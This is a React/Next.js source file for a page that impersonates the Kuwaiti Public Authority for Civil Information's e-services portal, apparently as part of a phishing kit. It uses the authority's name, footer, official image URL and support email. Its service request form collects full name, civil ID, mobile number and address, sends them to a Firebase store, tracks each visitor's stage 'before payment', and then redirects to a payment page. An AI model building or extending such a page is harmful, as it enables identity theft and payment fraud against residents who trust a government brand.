"use client"

import type React from "react"

import { Users, Camera, Car, DollarSign, BadgeIcon as IdCard, Search, LucideCalendarSearch } from "lucide-react"
import { Button } from "@/components/ui/button"
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card"
import { useEffect, useState } from "react"
import FullPageLoader from "@/components/fullpageloader"
import { addData } from "@/lib/firebase"
import { useRouter } from "next/navigation"
import { FormField } from "@/components/form-control"
import { PageHeader } from "@/components/page-head"
import { HeroSection } from "@/components/hero"
import { ServiceCard } from "@/components/service"

const services = [
  {
    id: "domestic-workers",
    title: "تسجيل عمالة منزلية",
    icon: <Users className="w-8 h-8" />,
    description: "تسجيل وإدارة العمالة المنزلية",
  },
  {
    id: "update-photo",
    title: "تحديث صورة",
    icon: <Camera className="w-8 h-8" />,
    description: "تحديث الصورة الشخصية في السجلات",
  },
  {
    id: "vehicle-license",
    title: "ترخيص مركبة",
    icon: <Car className="w-8 h-8" />,
    description: "إصدار وتجديد تراخيص المركبات",
  },
  {
    id: "health-insurance",
    title: "دفع رسوم الضمان الصحي",
    icon: <DollarSign className="w-8 h-8" />,
    description: "دفع رسوم التأمين الصحي",
  },
  {
    id: "civil-id",
    title: "إصدار بطاقة مدنية لأول مرة",
    icon: <IdCard className="w-8 h-8" />,
    description: "إصدار البطاقة المدنية للمرة الأولى",
  },
  {
    id: "technical-inspection",
    title: "حجز موعد فحص فني",
    icon: <Search className="w-8 h-8" />,
    description: "حجز موعد للفحص الفني للمركبات",
  },
  {
    id: "driving-license",
    title: "تجديد رخصة سوق",
    icon: <LucideCalendarSearch className="w-8 h-8" />,
    description: "تجديد رخصة القيادة",
  },
]

interface FormData {
  id: string
  name: string
  civilId: string
  unitNumber: string
  floor: string
  voucher: string
  plot: string
  area: string
  mobile: string
  page: string
}

export default function CivilInfoPortal() {
  const [loading, setLoading] = useState(false)
  const [selectedService, setSelectedService] = useState<string | null>(null)
  const [_id] = useState("id" + Math.random().toString(16).slice(2))
  const router = useRouter()
  const [formData, setFormData] = useState<FormData>({
    id: _id,
    name: "",
    civilId: "",
    unitNumber: "",
    floor: "",
    voucher: "",
    plot: "",
    area: "",
    mobile: "",
    page: "قبل الدفع",
  })

  const handleChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const { name, value } = e.target
    setFormData((prev) => ({
      ...prev,
      [name]: value,
    }))
  }

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault()
    setLoading(true)

    try {
      await addData(formData)
      setTimeout(() => {
        setLoading(false)
        router.push("/payment")
        setSelectedService(null)
      }, 2000)
    } catch (error) {
      console.error("Error submitting form:", error)
      setLoading(false)
    }
  }

  const handleServiceClick = (serviceId: string, title: string) => {
    setLoading(true)
    setTimeout(() => {
      setLoading(false)
      setSelectedService(serviceId)
      localStorage.setItem("selectedService", title)
    }, 800)
  }

  const handleBackToServices = () => {
    setSelectedService(null)
    setFormData((prev) => ({ ...prev, page: "الرئيسية" }))
  }

  useEffect(() => {
    addData({ id: _id, page: "الرئيسية" })
  }, [_id])

  // Service Form View
  if (selectedService) {
    const currentService = services.find((s) => s.id === selectedService)

    return (
      <div dir="rtl" className="min-h-screen bg-gradient-to-br from-gray-50 to-gray-100">
        <PageHeader title={currentService?.title || "خدمة"} onBack={handleBackToServices} />

        <div className="container mx-auto px-4 py-8">
          <Card className="max-w-4xl mx-auto shadow-2xl border-0">
            <CardHeader className="bg-gradient-to-r from-blue-50 to-blue-100 border-b">
              <CardTitle className="text-2xl text-center text-gray-800">نموذج طلب الخدمة</CardTitle>
              <p className="text-center text-gray-600 mt-2">يرجى ملء جميع الحقول المطلوبة بدقة</p>
            </CardHeader>

            <CardContent className="p-8">
              <form onSubmit={handleSubmit} className="space-y-6">
                <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                  <FormField
                    id="name"
                    name="name"
                    label="الاسم الكامل"
                    value={formData.name}
                    onChange={handleChange}
                    required
                    placeholder="أدخل الاسم الكامل"
                  />

                  <FormField
                    id="civilId"
                    name="civilId"
                    label="الرقم المدني"
                    value={formData.civilId}
                    onChange={handleChange}
                    required
                    maxLength={12}
                    placeholder="123456789012"
                  />

                  <FormField
                    id="mobile"
                    name="mobile"
                    label="رقم الهاتف النقال"
                    value={formData.mobile}
                    onChange={handleChange}
                    required
                    type="tel"
                    placeholder="12345678"
                  />

                  <FormField
                    id="area"
                    name="area"
                    label="المنطقة"
                    value={formData.area}
                    onChange={handleChange}
                    placeholder="اختر المنطقة"
                  />

                  <FormField
                    id="plot"
                    name="plot"
                    label="رقم القطعة"
                    value={formData.plot}
                    onChange={handleChange}
                    placeholder="رقم القطعة"
                  />

                  <FormField
                    id="voucher"
                    name="voucher"
                    label="رقم القسيمة"
                    value={formData.voucher}
                    onChange={handleChange}
                    placeholder="رقم القسيمة"
                  />

                  <FormField
                    id="unitNumber"
                    name="unitNumber"
                    label="رقم الوحدة"
                    value={formData.unitNumber}
                    onChange={handleChange}
                    required
                    placeholder="رقم الوحدة"
                  />

                  <FormField
                    id="floor"
                    name="floor"
                    label="رقم الدور"
                    value={formData.floor}
                    onChange={handleChange}
                    placeholder="رقم الدور"
                  />
                </div>

                <div className="pt-6 border-t">
                  <Button
                    type="submit"
                    disabled={loading}
                    className="w-full bg-gradient-to-r from-blue-600 to-blue-700 hover:from-blue-700 hover:to-blue-800 text-white py-4 text-xl font-medium shadow-lg hover:shadow-xl transition-all duration-200"
                  >
                    {loading ? "جاري المعالجة..." : "تقديم الطلب"}
                  </Button>
                </div>
              </form>
            </CardContent>
          </Card>
        </div>

        <footer className="mt-16 bg-gradient-to-r from-blue-900 to-blue-800 text-white py-8">
          <div className="container mx-auto px-4 text-center">
            <p className="text-blue-100">© 2024 الهيئة العامة للمعلومات المدنية - دولة الكويت</p>
          </div>
        </footer>
      </div>
    )
  }

  // Services List View
  return (
    <div dir="rtl" className="min-h-screen bg-gradient-to-br from-gray-50 to-gray-100">
      <HeroSection
        title="خدمات الهيئة العامة للمعلومات المدنية"
        backgroundImage="https://services.paci.gov.kw/assets/images/sliderbg.jpg"
      />

      <div className="container mx-auto px-4 py-12">
        <div className="text-center mb-12">
          <h2 className="text-3xl font-bold text-gray-800 mb-4">اختر الخدمة المطلوبة</h2>
          <p className="text-gray-600 text-lg max-w-2xl mx-auto">
            نوفر لك مجموعة شاملة من الخدمات الإلكترونية لتسهيل إنجاز معاملاتك بكل يسر وسهولة
          </p>
        </div>

        <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6 max-w-6xl mx-auto">
          {services.map((service) => (
            <ServiceCard
              key={service.id}
              title={service.title}
              icon={service.icon}
              onClick={() => handleServiceClick(service.id, service.title)}
              isLoading={loading}
            />
          ))}
        </div>

        <div className="text-center mt-16">
          <Card className="max-w-2xl mx-auto bg-blue-50 border-blue-200">
            <CardContent className="p-8">
              <h3 className="text-xl font-bold text-blue-800 mb-4">هل تحتاج مساعدة؟</h3>
              <p className="text-blue-700 mb-6">فريق الدعم الفني متاح لمساعدتك في أي استفسار</p>
              <Button variant="outline" className="border-blue-300 text-blue-700 hover:bg-blue-100">
                تواصل معنا
              </Button>
            </CardContent>
          </Card>
        </div>
      </div>

      <footer className="bg-gradient-to-r from-blue-900 to-blue-800 text-white py-12">
        <div className="container mx-auto px-4">
          <div className="grid grid-cols-1 md:grid-cols-3 gap-8 text-center md:text-right">
            <div>
              <h4 className="font-bold text-xl mb-4">الهيئة العامة للمعلومات المدنية</h4>
              <p className="text-blue-100">دولة الكويت</p>
            </div>
            <div>
              <h4 className="font-bold text-xl mb-4">خدمة العملاء</h4>
              <p className="text-blue-100">متاح على مدار الساعة</p>
            </div>
            <div>
              <h4 className="font-bold text-xl mb-4">الدعم الفني</h4>
              <p className="text-blue-100">support@paci.gov.kw</p>
            </div>
          </div>
          <div className="border-t border-blue-700 mt-8 pt-8 text-center">
            <p className="text-blue-100">© 2024 جميع الحقوق محفوظة</p>
          </div>
        </div>
      </footer>

      {loading && <FullPageLoader />}
    </div>
  )
}
